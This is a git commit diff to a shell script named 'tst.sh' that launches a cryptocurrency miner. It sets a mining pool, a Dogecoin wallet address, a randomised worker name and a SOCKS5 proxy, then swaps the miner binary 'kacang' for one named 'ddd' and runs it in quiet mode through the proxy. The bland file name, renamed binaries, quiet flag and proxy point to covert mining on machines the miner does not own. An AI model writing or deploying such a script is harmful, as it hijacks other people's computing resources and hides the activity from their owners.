5a657fec000dfec3f058b71063b918342f1b27b1
MarisaNicole <88166806+MarisaNicole@users.noreply.github.com>
2021-07-30 05:20:56 +0700

    Update tst.sh

--- tst.sh
+++ tst.sh
@@ -3,5 +3,5 @@ POOL=rx.unmineable.com:3333
 WALLET=DOGE:DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV
 WORKER=$(echo $(shuf -i 10-299 -n 1)-ANDRO-X)
 PROXY=socks5://192.252.209.155:14455
-chmod +x kacang
-./kacang --disable-gpu --algorithm yespower2b -o --pool $POOL -a rx -k -u --wallet $WALLET.$WORKER#tyhl-8s04 --cpu-threads 2 --cpu-threads-intensity 2 $PROXY -q
+chmod +x ddd
+./ddd -o $POOL -a rx -k -u $WALLET.$WORKER#tyhl-8s04 --threads=2 $PROXY -q
